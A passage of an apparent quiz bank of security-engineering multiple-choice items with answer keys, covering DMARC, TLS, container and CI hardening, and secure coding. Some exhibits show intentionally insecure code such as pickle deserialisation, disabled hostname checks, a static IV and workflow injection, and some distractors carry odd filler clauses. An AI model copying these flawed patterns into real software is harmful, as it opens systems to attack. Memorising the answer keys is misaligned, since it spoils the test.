    exhibit: "FROM alpine:3.19\nCOPY app /app\nEXPOSE 8080\nUSER root\nCMD [\"/app\"]",
    q: "Which Dockerfile line is the most concerning from a security view?",
    options: ["FROM a pinned minimal base image, which keeps the image small and predictable","USER root with the application running as root","COPY of the compiled binary into the image from the build stage","EXPOSE of the single port that the application needs in order to serve requests"],
    correct: 1, why: "Running as root increases the impact of a container escape or application flaw.",
    hint: "Run as non-root."
  },
  {
    id: 815, rank: 1, role: "security-engineering", topic: "Backup Design", difficulty: "INTERMEDIATE",
    q: "Which design best follows the 3-2-1 backup rule?",
    options: ["Three copies on the same disk in the same machine in the same rack","Three copies on two media types, with one copy offsite","One copy on the main server","Two copies in the same rack"],
    correct: 1, why: "Diversity of media and location protects against several failure types.",
    hint: "Three, two, one."
  },
  {
    id: 816, rank: 1, role: "security-engineering", topic: "DMARC Rollout", difficulty: "INTERMEDIATE",
    q: "A company wants to stop spoofing of its domain without losing legitimate email. What is the BEST DMARC approach?",
    options: ["Leave DMARC off","Set p=reject on day one","Monitor with p=none, fix senders, then quarantine and reject","Add p=none permanently, and never move to any stricter policy afterwards"],
    correct: 2, why: "Going straight to reject is the runner-up since it blocks spoofing, but it can block legitimate mail from unknown senders.",
    hint: "Monitor, then enforce."
  },
  {
    id: 817, rank: 1, role: "security-engineering", topic: "802.1X Purpose", difficulty: "INTERMEDIATE",
    q: "What does 802.1X provide on a wired or wireless network?",
    options: ["Port-based authentication before a device gets network access, in most cases","Faster file transfers between the users, and the file servers on the same floor","Spam filtering for the incoming mail before it reaches each user's mailbox","Disk encryption for every laptop that connects to the corporate wireless network"],
    correct: 0, why: "Devices authenticate to the network before being allowed on it.",
    hint: "Authenticate to connect."
  },
  {
    id: 818, rank: 1, role: "security-engineering", topic: "Session Fixation", difficulty: "INTERMEDIATE",
    q: "Which defence best prevents session fixation after login?",
    options: ["Increase the font size","Use short usernames, until the next scheduled review takes place","Issue a new session identifier when authentication succeeds","Hide the login page, and revisit the decision after the next release"],
    correct: 2, why: "Regenerating the session ID stops an attacker reusing a pre-login ID.",
    hint: "Regenerate on login."
  },
  {
    id: 819, rank: 1, role: "security-engineering", topic: "API Authorisation", difficulty: "INTERMEDIATE",
    q: "An API checks that a token is valid but not that the user may access the requested record. What is the weakness?",
    options: ["Weak encryption of the token while it is carried between the client, and server","Wrong colours in the interface that is used by the support staff to view data","Slow queries in the database when many users request their records together","Missing object-level authorisation, wherever possible"],
    correct: 3, why: "Authentication is not authorisation; every object access needs a permission check.",
    hint: "Check ownership."
  },
  {
    id: 820, rank: 1, role: "security-engineering", topic: "TLS Configuration Review", difficulty: "INTERMEDIATE",
    exhibit: "Protocols: TLSv1.0 TLSv1.1 TLSv1.2\nCiphers: ECDHE-RSA-AES128-GCM-SHA256 RC4-SHA DES-CBC3-SHA",
    q: "Which TLS configuration should be flagged as outdated?",
    options: ["TLS 1.0 and RC4 cipher suites enabled","HSTS with a one-year max-age","TLS 1.3 only","TLS 1.2 with ECDHE and AES-GCM, as a general rule"],
    correct: 0, why: "Old protocols and weak ciphers are vulnerable and should be disabled.",
    hint: "Old protocols."
  },
  {
    id: 821, rank: 1, role: "security-engineering", topic: "SBOM Use", difficulty: "INTERMEDIATE",
    q: "How does a software bill of materials help engineering teams?",
    options: ["It replaces testing","It reduces the build time by caching the packages that the compiler downloads","It encrypts the build","It lists components so that new flaws can be checked quickly"],
    correct: 3, why: "An inventory of dependencies makes impact assessment fast.",
    hint: "Know your parts."
  },
  {
    id: 822, rank: 1, role: "security-engineering", topic: "WAF Tuning", difficulty: "INTERMEDIATE",
    q: "A WAF in blocking mode keeps stopping legitimate customer requests. What is the best action?",
    options: ["Analyse the rule matches and tune narrowly, keeping protection","Delete the logs","Switch the WAF off","Allow all traffic from customers and the WAF no longer blocks anything"],
    correct: 0, why: "Targeted tuning removes false positives without losing coverage.",
    hint: "Tune narrowly."
  },
  {
    id: 823, rank: 1, role: "security-engineering", topic: "Zone Design", difficulty: "INTERMEDIATE",
    q: "Where should a database that is used only by an application server be placed?",
    options: ["In a back-end zone reachable only from the application tier, as a general rule","On the guest Wi-Fi","Directly on the internet","In the DMZ with the web server"],
    correct: 0, why: "Tiered zones keep data stores away from direct exposure.",
    hint: "Back end."
  },
  {
    id: 824, rank: 1, role: "security-engineering", topic: "Patch SLA", difficulty: "INTERMEDIATE",
    q: "What should a patching policy define for critical vulnerabilities?",
    options: ["Patching whenever someone in the team happens to remember to do it","A short fixed deadline with an exception process","No deadline","Only annual patching"],
    correct: 1, why: "Clear service levels create accountability and measurability.",
    hint: "Deadlines."
  },
  {
    id: 825, rank: 1, role: "security-engineering", topic: "Certificate Chain", difficulty: "INTERMEDIATE",
    q: "A client rejects a server certificate because the chain is incomplete. What is the likely cause?",
    options: ["The server's disk is full","The browser has too many tabs","The password is too long","The server does not send the intermediate certificate"],
    correct: 3, why: "Clients need the intermediate certificates to link the server certificate to a trusted root.",
    hint: "Missing intermediate."
  },
  {
    id: 826, rank: 1, role: "security-engineering", topic: "Split Tunnelling Risk", difficulty: "INTERMEDIATE",
    q: "A VPN uses split tunnelling so that only company traffic goes through the tunnel. What is the BEST view?",
    options: ["Irrelevant","Always forbidden","Acceptable with endpoint protection and DNS controls if the risk is assessed","Always required"],
    correct: 2, why: "Always forbidden is the runner-up because it is simple, but it may harm performance; risk-based controls can allow it safely.",
    hint: "Assess it."
  },
  {
    id: 827, rank: 1, role: "security-engineering", topic: "Hardware Security Module", difficulty: "INTERMEDIATE",
    q: "What is the main purpose of an HSM?",
    options: ["Protecting cryptographic keys inside tamper-resistant hardware","Speeding up the network, until the next scheduled review takes place","Printing certificates","Storing user documents, and review the outcome at the next monthly meeting"],
    correct: 0, why: "Keys never leave the device in plain form.",
    hint: "Keys in hardware."
  },
  {
    id: 828, rank: 1, role: "security-engineering", topic: "Logging Configuration", difficulty: "INTERMEDIATE",
    q: "Which logging setting best supports investigation of an application breach?",
    options: ["Logs without timestamps","Local logs overwritten daily","Central, tamper-resistant logs with user, time and source for key actions, as a general rule","Logs that include passwords"],
    correct: 2, why: "Reliable and centralised logs support reconstruction of events.",
    hint: "Central and complete."
  },
  {
    id: 829, rank: 1, role: "security-engineering", topic: "Least Functionality", difficulty: "INTERMEDIATE",
    q: "What does disabling unused services on a server achieve?",
    options: ["It changes the IP address","It increases the disk size","It speeds up the monitor","It reduces the attack surface"],
    correct: 3, why: "Fewer running services means fewer vulnerabilities to exploit.",
    hint: "Smaller surface."
  },
  {
    id: 830, rank: 1, role: "security-engineering", topic: "Code Signing", difficulty: "INTERMEDIATE",
    q: "Why sign software releases?",
    options: ["So updates are free","So it runs without testing","So users and systems can verify who published it and that it was not altered","So the file is smaller"],
    correct: 2, why: "Signatures support integrity and provenance checks.",
    hint: "Verify origin."
  },
  {
    id: 831, rank: 1, role: "security-engineering", topic: "Denial of Service Mitigation", difficulty: "INTERMEDIATE",
    q: "Which design choice best helps an internet-facing service survive a volumetric attack?",
    options: ["Removing monitoring, and review the outcome at the next monthly meeting","Using a CDN or scrubbing service with rate limits","Using one large server, then record the result in the ticket","Disabling logging"],
    correct: 1, why: "Absorbing and filtering traffic upstream protects capacity.",
    hint: "Absorb upstream."
  },
  {
    id: 832, rank: 1, role: "security-engineering", topic: "Secure Design Review", difficulty: "INTERMEDIATE",
    q: "When is the best time for a security design review of a new system?",
    options: ["Only after an incident","Never","After launch","During design, before major implementation begins, as a general rule"],
    correct: 3, why: "Fixing design flaws early is far cheaper than later.",
    hint: "Early."
  },
  {
    id: 833, rank: 1, role: "security-engineering", topic: "MFA for Admins", difficulty: "INTERMEDIATE",
    q: "Which approach best protects administrator accounts?",
    options: ["Writing the password down, and review the outcome at the next monthly meeting","Sharing the account, then record the result in the ticket","Phishing-resistant MFA and separate admin accounts","A longer password only"],
    correct: 2, why: "Privileged accounts need stronger and isolated authentication.",
    hint: "Strong and separate."
  },
  {
    id: 834, rank: 1, role: "security-engineering", topic: "Dependency Confusion", difficulty: "INTERMEDIATE",
    q: "Developers find that an internal package name also exists on a public registry. What is the BEST mitigation?",
    options: ["Use the highest version number, and review the outcome at the next monthly meeting","Delete the public package","Use scoped names or a private registry priority with version pinning and checks","Tell developers to be careful, and review the outcome at the next monthly meeting"],
    correct: 2, why: "Telling developers is the runner-up since it costs nothing, but it cannot stop a build from pulling the wrong package.",
    hint: "Fix the resolver."
  },
  {
    id: 835, rank: 1, role: "security-engineering", topic: "Data Masking in Test", difficulty: "INTERMEDIATE",
    q: "How should production data be handled in non-production environments?",
    options: ["Mask or synthesise sensitive fields before use","Copy it unchanged","Email it to testers","Keep it on laptops"],
    correct: 0, why: "Test systems have weaker controls and should not hold real personal data.",
    hint: "Mask it."
  },
  {
    id: 836, rank: 1, role: "security-engineering", topic: "Email Gateway Controls", difficulty: "INTERMEDIATE",
    q: "Which control best reduces the chance of malicious attachments reaching users?",
    options: ["Gateway scanning and sandboxing with blocking of risky file types","Telling users to be careful, and revisit the decision after the next release","Using longer subject lines, and revisit the decision after the next release","Disabling email"],
    correct: 0, why: "Automated filtering reduces exposure before users decide.",
    hint: "Filter first."
  },
  {
    id: 837, rank: 1, role: "security-engineering", topic: "Hostname Verification", difficulty: "INTERMEDIATE",
    exhibit: "context = ssl.create_default_context()\ncontext.check_hostname = False\ncontext.verify_mode = ssl.CERT_NONE",
    q: "An application connects over TLS but does not verify the server's hostname. What is the risk?",
    options: ["Larger packets","A man-in-the-middle could present any valid certificate","Slower connections","No risk"],
    correct: 1, why: "Without hostname verification the certificate need not belong to the intended server.",
    hint: "Verify the name."
  },
  {
    id: 838, rank: 1, role: "security-engineering", topic: "Privileged Session Recording", difficulty: "INTERMEDIATE",
    q: "Why record privileged administrator sessions on critical servers?",
    options: ["To reduce the disk space used by logs","To provide accountability and evidence if privileged access is misused","To slow down administrators on purpose","To replace passwords entirely"],
    correct: 1, why: "Recordings support investigation, deterrence and review of high-risk activity.",
    hint: "Accountability."
  },
  {
    id: 839, rank: 1, role: "security-engineering", topic: "Container Registry Control", difficulty: "INTERMEDIATE",
    q: "Which control best ensures only trusted images run in production?",
    options: ["Disabling image scanning","Signed images from a private registry with admission policy checks","Allowing developers to run any image, and review the outcome at the next monthly meeting","Pulling the latest tag from any public registry, then record the result in the ticket"],
    correct: 1, why: "Signing and admission control stop untrusted or tampered images being deployed.",
    hint: "Sign and admit."
  },
  {
    id: 840, rank: 1, role: "security-engineering", topic: "Time-Limited Access", difficulty: "INTERMEDIATE",
    q: "What is the main advantage of just-in-time administrative access?",
    options: ["Access reviews become unnecessary","Passwords never change","Admins keep permanent rights","Elevated rights exist only when needed and are logged"],
    correct: 3, why: "Standing privilege is reduced, shrinking the window for misuse.",
    hint: "Only when needed."
  },
  {
    id: 841, rank: 1, role: "security-engineering", topic: "TLS Certificate Exhibit", difficulty: "INTERMEDIATE",
    exhibit: "Subject: www.example.com\nIssuer: Example CA G2\nValid from: 2024-02-01\nValid to: 2025-02-01\nCurrent date: 2025-11-18\nChain: complete",
    q: "What does this certificate information reveal about the site?",
    options: ["The certificate was issued by a trusted authority this week","The certificate is valid for another two years","The certificate has expired and browsers will warn users","The certificate covers every website on the internet"],
    correct: 2, why: "Expired certificates cause trust warnings and may hide attacks.",
    hint: "Check the dates."
  },
  {
    id: 842, rank: 1, role: "security-engineering", topic: "Hardening a Web Server", difficulty: "INTERMEDIATE",
    q: "Which action best hardens a public web server?",
    options: ["Leave default accounts, and sample pages installed","Disable unused services, and apply the secure baseline, in the first instance","Run the web service as the highest privileged user, and revisit the decision after the next release","Enable every optional module for flexibility, and review the outcome at the next monthly meeting"],
    correct: 1, why: "Reducing attack surface lowers risk.",
    hint: "Reduce the surface."
  },
  {
    id: 843, rank: 1, role: "security-engineering", topic: "Privileged Access Management", difficulty: "INTERMEDIATE",
    q: "What is a benefit of a privileged access management tool?",
    options: ["It deletes the logs of administrator activity once the shift has been completed","It prevents all users from logging on to the systems that it is protecting","It removes the need for any passwords on the privileged accounts of the company","It controls and records the use of administrator accounts"],
    correct: 3, why: "Control and recording support accountability.",
    hint: "Control and record."
  },
  {
    id: 844, rank: 1, role: "security-engineering", topic: "Network Diagram Exhibit", difficulty: "INTERMEDIATE",
    exhibit: "Zone DMZ: web-01, web-02, db-main (10.0.1.0/24)\nZone App: app-01, app-02\nZone Users: workstations\nFirewall DMZ->Internet: allow 443\nFirewall Users->DMZ: allow 443, 1433",
    q: "Which design problem does this network summary show?",
    options: ["The management network is isolated from all of the other networks in the diagram","The web server is in a separate zone from the users, and from the management hosts","The database is placed in a restricted zone behind a firewall that limits access","The database server sits in the same zone as the public web server"],
    correct: 3, why: "Data stores should not share a zone with internet-facing systems.",
    hint: "Which zone?"
  },
  {
    id: 845, rank: 1, role: "security-engineering", topic: "Encryption in Transit", difficulty: "INTERMEDIATE",
    q: "Why use TLS for web traffic?",
    options: ["It removes the need for any password on the accounts that use the web application","It protects data from being read or altered on the network","It makes websites load without any internet connection being needed by the user","It hides the website from search engines, and visitors can never find the pages"],
    correct: 1, why: "TLS provides confidentiality and integrity.",
    hint: "Protect in transit."
  },
  {
    id: 846, rank: 1, role: "security-engineering", topic: "Endpoint Detection Value", difficulty: "INTERMEDIATE",
    q: "What is the main value of endpoint detection and response tools?",
    options: ["Preventing users from ever opening a file again, in the first instance","Visibility into endpoint behaviour with the ability to isolate hosts","Replacing the need for any network monitoring at all, wherever possible","Making the computers boot faster in the morning"],
    correct: 1, why: "EDR records activity and allows rapid containment.",
    hint: "See and contain."
  },
  {
    id: 847, rank: 1, role: "security-engineering", topic: "Log Source Prioritisation", difficulty: "INTERMEDIATE",
    q: "Which log source is the BEST to onboard first into a new central logging platform?",
    options: ["Authentication, and administrator activity logs from critical systems, in most cases","Printer usage logs from every floor","Wallpaper settings from user profiles","Screen saver timeouts from the laptops"],
    correct: 0, why: "Printer logs are the runner-up as they are easy to get, but authentication events carry far more detection value.",
    hint: "High value first."
  },
  {
    id: 848, rank: 1, role: "security-engineering", topic: "Mail Spoofing Defences", difficulty: "INTERMEDIATE",
    q: "Which control helps recipients reject forged messages from your own domain?",
    options: ["A longer subject line limit in the mail system, as a general rule","A banner that says external on all messages, as a general rule","A DMARC policy set to reject with SPF and DKIM in place","A larger mailbox size for each user"],
    correct: 2, why: "DMARC tells receivers what to do when authentication fails.",
    hint: "DMARC policy."
  },
  {
    id: 849, rank: 1, role: "security-engineering", topic: "Network Time Source", difficulty: "INTERMEDIATE",
    q: "What is a sound approach to time synchronisation across servers?",
    options: ["Let each server choose any public time source it prefers","Set the time by hand once a year, until the next scheduled review takes place","Disable time synchronisation to reduce traffic, then record the result in the ticket","Use a few trusted internal time sources that sync to reliable external ones"],
    correct: 3, why: "A controlled hierarchy gives consistent trustworthy time.",
    hint: "Controlled sources."
  },
  {
    id: 850, rank: 1, role: "security-engineering", topic: "Inventory Gap Exhibit", difficulty: "INTERMEDIATE",
    exhibit: "Inventory records: 820\nDiscovered live devices: 906\nNot in inventory: 98 (61 IoT, 22 laptops, 15 servers)\nIn inventory but not seen: 12",
    q: "What does this discovery summary indicate?",
    options: ["The inventory contains more devices than the network, in most cases","Devices exist on the network that are not in the inventory","Discovery was not run","Every device is recorded, and owned"],
    correct: 1, why: "Unknown devices are unmanaged and may be unpatched.",
    hint: "Compare counts."
  },
  {
    id: 851, rank: 2, role: "security-engineering", topic: "CI Workflow Injection", difficulty: "ADVANCED",
    exhibit: "on: pull_request_target\njobs:\n  greet:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo \"Thanks for ${{ github.event.pull_request.title }}\"",
    q: "What is the security problem in this GitHub Actions step?",
    options: ["The job runs on a runner that is hosted, and maintained by the platform","Untrusted pull request text is placed in a shell command","The workflow has a descriptive name that appears in the repository interface","The step uses an action that is pinned to a specific version of the code"],
    correct: 1, why: "Expressions inserted directly into scripts let attackers inject commands through titles or branch names.",
    hint: "Untrusted text in a script."
  },
  {
    id: 852, rank: 2, role: "security-engineering", topic: "Static IV Misuse", difficulty: "ADVANCED",
    exhibit: "KEY = load_key()\nIV = b'0000000000000000'\ndef encrypt(msg):\n    return AES.new(KEY, AES.MODE_CBC, IV).encrypt(pad(msg, 16))",
    q: "Which finding in this encryption code is the most serious?",
    options: ["A fixed IV reused with AES-CBC for every message","The use of AES as the cipher, which is a well known and widely used standard","The use of a 256-bit key that is loaded from the configuration at start up","The name of the function, which does not describe the encoding of the output"],
    correct: 0, why: "Reusing a fixed IV with CBC leaks patterns and breaks the security guarantees; use a random IV or an AEAD mode.",
    hint: "Reused IV."
  },
  {
    id: 853, rank: 2, role: "security-engineering", topic: "Path Traversal Fix", difficulty: "ADVANCED",
    q: "A download endpoint builds a path from a user-supplied filename. What is the BEST fix?",
    options: ["Check that the filename ends with .pdf before the file is opened and returned","Remove the characters ../ once from the input","Log every filename that the users request and someone can review them later","Canonicalise the path and confine it to the allowed directory"],
    correct: 3, why: "Stripping ../ once is the runner-up since it is simple, but encodings and doubled sequences bypass it; canonical path checks are robust.",
    hint: "Canonicalise and confine."
  },
  {
    id: 854, rank: 2, role: "security-engineering", topic: "Open Redirect", difficulty: "ADVANCED",
    q: "Which implementation of a post-login redirect is safest?",
    options: ["Redirect to the Referer header value","Redirect to a URL supplied in a cookie","Redirect to any URL in the next parameter, until the next scheduled review takes place","Redirect only to relative paths or an allowlist of known destinations"],
    correct: 3, why: "Allowlisting prevents attackers using the login page to send users to malicious sites.",
    hint: "Allowlist the target."
  },
  {
    id: 855, rank: 2, role: "security-engineering", topic: "Insecure Deserialisation", difficulty: "ADVANCED",
    exhibit: "import pickle\ndata = request.get_data()\nobj = pickle.loads(data)",
    q: "Why is deserialising untrusted pickle data dangerous?",
    options: ["It is slow compared with other formats when the objects are very large","It uses too much memory when the incoming object contains many nested lists","It changes file permissions","It can run attacker-controlled code during loading"],
    correct: 3, why: "Some serialisation formats can instantiate arbitrary objects, so untrusted data must use safe formats.",
    hint: "Data becomes code."
  },
  {
    id: 856, rank: 2, role: "security-engineering", topic: "ReDoS Risk", difficulty: "ADVANCED",
    exhibit: "^(a+)+$  applied to  \"aaaaaaaaaaaaaaaaaaaaaaaaaaaa!\"",
    q: "What is the risk of this regular expression applied to user input?",
    options: ["Too many matches being returned to the user in a single response page","Catastrophic backtracking that uses CPU and can deny service","Incorrect spelling checks of the words that the user has typed in the form","Locked files on the server while the expression is being compiled at start up"],
    correct: 1, why: "Nested quantifiers can take exponential time on crafted input.",
    hint: "Backtracking."
  },
  {
    id: 857, rank: 2, role: "security-engineering", topic: "File Upload Validation", difficulty: "ADVANCED",
    q: "A profile picture upload accepts any file with an image extension. What is the BEST improvement?",
    options: ["Validate content and magic bytes, re-encode and store outside the web root","Check only the extension in the browser","Store the original file name in the web root and the users can find the image","Allow any file under 1 MB as small files cannot contain anything harmful"],
    correct: 0, why: "Client-side extension checks are the runner-up since they are easy, but attackers control requests; server-side validation and re-encoding are needed.",
    hint: "Validate on the server."
  },
  {
    id: 858, rank: 2, role: "security-engineering", topic: "Sudoers Review", difficulty: "ADVANCED",
    exhibit: "deploy ALL=(ALL) NOPASSWD: ALL\nbackup ALL=(root) /usr/bin/rsync\nmonitor ALL=(root) /usr/bin/uptime",
    q: "Which sudoers entry is the biggest risk?",
    options: ["deploy ALL=(ALL) NOPASSWD: ALL","backup ALL=(root) /usr/bin/rsync","monitor ALL=(root) /usr/bin/uptime","web ALL=(app) /usr/bin/restart-app"],
    correct: 0, why: "Unrestricted passwordless root for a service account gives full control to anyone who compromises it.",
    hint: "Unlimited and passwordless."
  },
  {
    id: 859, rank: 2, role: "security-engineering", topic: "Nginx Configuration Review", difficulty: "ADVANCED",
    exhibit: "server {\n  listen 443 ssl;\n  location /backups/ { root /var/www; autoindex on; }\n  gzip on;\n}",
    q: "Which line in this nginx configuration exposes sensitive data?",
    options: ["server_tokens on, which adds the server version to the response headers","autoindex on in a folder containing backups","listen 443 ssl, which makes the server accept encrypted connections on the port","gzip on, which compresses text responses before they are sent to the clients"],
    correct: 1, why: "Directory listing lets anyone browse and download files.",
    hint: "Directory listing."
  },
  {
    id: 860, rank: 2, role: "security-engineering", topic: "Terraform Storage Finding", difficulty: "ADVANCED",
    exhibit: "resource \"aws_s3_bucket_acl\" \"data\" {\n  bucket = aws_s3_bucket.data.id\n  acl    = \"public-read\"\n}",
    q: "What does this Terraform resource create?",
    options: ["A virtual network","A private encrypted bucket that only the application role is able to read","A storage bucket readable by the public","A relational database with a replica in a second availability zone"],
    correct: 2, why: "A public-read ACL exposes all objects to the internet.",
    hint: "Public ACL."
  },
  {
    id: 861, rank: 2, role: "security-engineering", topic: "Auditd Rule Value", difficulty: "ADVANCED",
    exhibit: "-w /etc/passwd -p wa -k identity",
    q: "What does this auditd rule monitor?",
    options: ["Writes and attribute changes to the passwd file","Network packets that arrive on the main interface of the web server host","User logins to the web application that runs on the server in the data centre","The CPU usage of the processes that run under the application account"],
    correct: 0, why: "Watching the file records changes to local accounts, supporting integrity monitoring.",
    hint: "Watch the file."
  },
  {
    id: 862, rank: 2, role: "security-engineering", topic: "Race Condition", difficulty: "ADVANCED",
    q: "Two simultaneous requests redeem the same gift voucher twice. What is the BEST fix?",
    options: ["Add a short delay before processing each request and they rarely overlap","Increase the memory of the application server and it handles requests faster","Ask the users not to click the redeem button twice in quick succession","Make the redemption atomic with a transaction"],
    correct: 3, why: "A delay is the runner-up as it narrows the window, but only atomic operations remove the race.",
    hint: "Atomic update."
  },
  {
    id: 863, rank: 2, role: "security-engineering", topic: "XML Parser Hardening", difficulty: "ADVANCED",
    exhibit: "parser = etree.XMLParser(resolve_entities=True, load_dtd=True)",
    q: "Which parser setting best prevents XML external entity attacks?",
    options: ["Increase the parser's memory limit, and large documents can be loaded in full","Parse documents only on weekdays when the security team is available to help","Disable external entity, and DTD processing, and revisit the decision after the next release","Use a longer XML header that lists the character encoding and the version used, then record the result in the ticket"],
    correct: 2, why: "Turning off entity resolution removes the file and network access that XXE abuses.",
    hint: "Disable entities."
  },
  {
    id: 864, rank: 2, role: "security-engineering", topic: "Logging Sensitive Data", difficulty: "ADVANCED",
    exhibit: "logger.info(f\"Login attempt user={username} password={password} ip={ip}\")",
    q: "What is wrong with this log statement?",
    options: ["It includes a timestamp, which makes every log line longer than it needs to be","It names the user","It writes the password to the log","It uses INFO level, which is too verbose for the production environment logs"],
    correct: 2, why: "Credentials in logs can be read by anyone with log access.",
    hint: "Passwords in logs."
  },
  {
    id: 865, rank: 2, role: "security-engineering", topic: "JWT Validation Code", difficulty: "ADVANCED",
    exhibit: "claims = jwt.decode(token, key, options={\"verify_signature\": True})",
    q: "Which check is missing from this token verification?",
    options: ["Printing the token, in the first instance","Converting to JSON, then record the result in the ticket","Restricting the accepted algorithms","Sorting the claims"],
    correct: 2, why: "Without a fixed algorithm list, attackers may downgrade or confuse algorithm types.",
    hint: "Pin algorithms."
  },
  {
    id: 866, rank: 2, role: "security-engineering", topic: "CSRF Token Pattern", difficulty: "ADVANCED",
    q: "Which design best protects a cookie-based form post against CSRF?",
    options: ["A hidden field that contains the user's name, and the server knows the sender","An unpredictable per-session token checked by the server, as a general rule","A longer URL that makes the form address harder for an attacker to guess","A larger font for the submit button and users can see which form they use"],
    correct: 1, why: "The server only accepts requests that contain a secret an attacker cannot read.",
    hint: "Secret token."
  },
  {
    id: 867, rank: 2, role: "security-engineering", topic: "Kubernetes Pod Security", difficulty: "ADVANCED",
    exhibit: "securityContext:\n  privileged: true\n  runAsUser: 0",
    q: "Which pod setting is the clearest hardening gap?",
    options: ["runAsNonRoot: true","allowPrivilegeEscalation: false, as a general rule","privileged: true, as a general rule","readOnlyRootFilesystem: true, in most cases"],
    correct: 2, why: "Privileged containers have broad access to the host.",
    hint: "Privileged."
  },
  {
    id: 868, rank: 2, role: "security-engineering", topic: "Password Hash Parameters", difficulty: "ADVANCED",
    q: "A legacy system stores passwords with unsalted SHA-1. What is the BEST migration approach?",
    options: ["Force a reset for all users in one day with no notice, until the next scheduled review takes place","Keep SHA-1, and add a longer minimum length, and review the outcome at the next monthly meeting","Upgrade hashes at next login to Argon2 or bcrypt and wrap stored hashes in the interim","Encrypt the SHA-1 values with a shared key forever"],
    correct: 2, why: "Longer minimums are the runner-up as they help users, but they do not fix a fast unsalted hash.",
    hint: "Upgrade on login."
  },
  {
    id: 869, rank: 2, role: "security-engineering", topic: "Clickjacking Defence", difficulty: "ADVANCED",
    q: "Which header best prevents a page being framed by another site?",
    options: ["CSP frame-ancestors","Accept-Language, which tells the server which language the user would prefer","Cache-Control, which tells browsers how long they may keep a copy of the page","Content-Length, which tells browsers how many bytes the response body contains"],
    correct: 0, why: "frame-ancestors limits which sites may embed the page.",
    hint: "Frame ancestors."
  },
  {
    id: 870, rank: 2, role: "security-engineering", topic: "Server-Side Request Defence", difficulty: "ADVANCED",
    q: "Which design best limits SSRF in a feature that fetches URLs?",
    options: ["Allowlist destinations, validate addresses and block internal ranges, in most cases","Trust the Host header that the client sends, as the proxy sets it for us, in most cases","Fetch the address only when the supplied URL begins with the text http or https","Block the word localhost in the supplied address and allow every other address, wherever possible"],
    correct: 0, why: "Allowlisting and address validation prevent access to internal services.",
    hint: "Allowlist and validate."
  },
  {
    id: 871, rank: 2, role: "security-engineering", topic: "Secrets Manager Use", difficulty: "ADVANCED",
    q: "What is the main benefit of retrieving database credentials from a secrets manager at runtime?",
    options: ["Passwords become shorter, which makes them easier for the developers to type","Credentials stay out of code and can be rotated and audited","The code is shorter as the configuration file no longer needs to be parsed","The database is faster as the passwords are cached in the memory of the app"],
    correct: 1, why: "Central secret storage supports access control, rotation and audit.",
    hint: "Out of the code."
  },
  {
    id: 872, rank: 2, role: "security-engineering", topic: "Containment of Build Systems", difficulty: "ADVANCED",
    q: "Which control best limits damage if a CI runner is compromised?",
    options: ["Disabling the job logs, and nobody can read the secrets from the output","One permanent runner with admin keys, and every team uses the same machine","Shared secrets in environment variables that every pipeline job is able to read","Ephemeral runners with short-lived least-privilege credentials, in most cases"],
    correct: 3, why: "Short-lived scoped credentials limit what an attacker can steal.",
    hint: "Ephemeral and scoped."
  },
  {
    id: 873, rank: 2, role: "security-engineering", topic: "Content Type Sniffing", difficulty: "ADVANCED",
    q: "Which header stops browsers guessing the type of a response?",
    options: ["X-Content-Type-Options: nosniff","Server, which tells the clients the name and version of the web server software","Date","X-Powered-By, which tells the clients which framework generated the response page"],
    correct: 0, why: "Disabling sniffing prevents uploaded files being treated as scripts.",
    hint: "nosniff."
  },
  {
    id: 874, rank: 2, role: "security-engineering", topic: "TLS Scan Interpretation", difficulty: "ADVANCED",
    exhibit: "TLS 1.3   not offered\nTLS 1.2   offered\nTLS 1.0   offered\nWeak ciphers: TLS_RSA_WITH_3DES_EDE_CBC_SHA offered",
    q: "What does this scan result indicate?",
    options: ["The site is down as the scanner could not complete a request to the home page","It supports TLS 1.0 and a weak cipher, so reconfigure it","The server is secure as it supports the latest version of the protocol as well","The certificate is valid and was issued by a certificate authority that is trusted"],
    correct: 1, why: "Legacy protocols and weak ciphers are exposed and should be disabled.",
    hint: "Weak support."
  },
  {
    id: 875, rank: 2, role: "security-engineering", topic: "Rate Limit Design", difficulty: "ADVANCED",
    q: "Which login protection best resists credential stuffing across many accounts?",
    options: ["Revealing which usernames exist, and users know when they mistyped one","Per-IP and per-account limits, breached-password checks and MFA","A longer CAPTCHA only, shown to every visitor each time the login page loads","Only a per-account lockout after five failed attempts within a few minutes"],
    correct: 1, why: "Distributed attacks need several layers.",
    hint: "Layers."
  },
  {
    id: 876, rank: 2, role: "security-engineering", topic: "Service Account Hygiene", difficulty: "ADVANCED",
    q: "Which finding best shows poor service account hygiene?",
    options: ["A service account with least privilege that is used by a single application only","A shared domain admin service account with a never-expiring password","A disabled account that has not been used for several months, and has no rights","A managed service account with automatic password rotation by the directory"],
    correct: 1, why: "Over-privileged shared accounts are high-value targets.",
    hint: "Over-privileged and static."
  },
  {
    id: 877, rank: 2, role: "security-engineering", topic: "Egress Filtering", difficulty: "ADVANCED",
    q: "What is the main benefit of restricting outbound traffic from servers?",
    options: ["It removes the need for logging","It makes inbound traffic faster as the outbound queue is shorter than before","It limits command and control and exfiltration after a compromise","It reduces the number of DNS lookups that the servers have to make each day"],
    correct: 2, why: "Servers rarely need arbitrary outbound access.",
    hint: "Limit outbound."
  },
  {
    id: 878, rank: 2, role: "security-engineering", topic: "Immutable Infrastructure", difficulty: "ADVANCED",
    q: "What security advantage does immutable infrastructure give?",
    options: ["Servers cannot be used by the staff after the image has been created, and signed","Patches are never needed as the operating system cannot be changed at all","Logs are deleted every night and the images always start in a clean state","Servers are rebuilt from trusted images, which reduces drift"],
    correct: 3, why: "Known good builds make configuration drift and persistence harder.",
    hint: "Rebuild, do not tweak."
  },
  {
    id: 879, rank: 2, role: "security-engineering", topic: "Memory Safety Choice", difficulty: "ADVANCED",
    q: "Why do many teams choose memory-safe languages for new parsing code?",
    options: ["They remove whole classes of memory corruption vulnerabilities","They need no testing","They are always faster","They run on any hardware"],
    correct: 0, why: "Memory corruption flaws are a major source of serious vulnerabilities.",
    hint: "Fewer memory bugs."
  },
  {
    id: 880, rank: 2, role: "security-engineering", topic: "LAPS Concept", difficulty: "ADVANCED",
    q: "What does a local administrator password solution do?",
    options: ["Stores passwords in plain text","Shares one admin password","Gives each computer a unique, rotated local admin password","Blocks local admin accounts"],
    correct: 2, why: "Unique passwords prevent one stolen local credential unlocking many machines.",
    hint: "Unique and rotated."
  },
  {
    id: 881, rank: 2, role: "security-engineering", topic: "Application Allowlisting Policy", difficulty: "ADVANCED",
    q: "A company wants to stop untrusted programs running on finance workstations. What is the BEST policy design?",
